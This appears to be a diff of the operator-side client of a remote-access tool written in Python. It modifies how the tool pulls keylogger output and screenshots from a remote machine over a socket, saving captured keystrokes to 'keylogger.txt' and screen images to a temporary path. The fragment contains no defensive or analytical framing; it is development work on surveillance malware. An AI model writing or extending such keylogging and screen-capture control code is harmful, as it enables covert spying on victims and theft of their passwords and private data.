@@ -97,7 +97,7 @@ class Client:
         elif cmd == '8':
           self.stop_keylogger()
         elif cmd == '9':
-          self.print_keylogger()
+          self.save_keylogger()
         elif cmd == '10':
           self.shutdown()
           break
@@ -109,7 +109,7 @@ class Client:
         exit()
 
   def save_file(self, path, file_name):
-    start_time = time.time()
+    # start_time = time.time()
     with open(os.path.join(path, file_name), 'wb') as f:
       while True:
         data = self.socket.recv(BUFFER_SIZE)
@@ -134,6 +134,7 @@ class Client:
 
   def take_screenshot(self):
     self.socket.send(CMD_TAKE_SCREENSHOT.encode())
+    self.save_file(TMP_PATH, 'screenshot.png')
 
   def start_keylogger(self):
     self.socket.send(CMD_START_KEYLOGGER.encode())
@@ -145,11 +146,10 @@ class Client:
     msg = self.recv_msg(FLAG_MSG_END)
     return msg
 
-  def print_keylogger(self):
+  def save_keylogger(self):
     self.socket.send(CMD_PRINT_KEYLOGGER.encode())
-    keys = self.recv_msg(FLAG_FILE_END)
-    return keys
-
+    self.save_file(TMP_PATH, 'keylogger.txt')
+    
   def view_processes(self):
     self.socket.send(CMD_VIEW_PROCESSES.encode())
     processes = self.recv_msg(FLAG_PROCESSES_END)
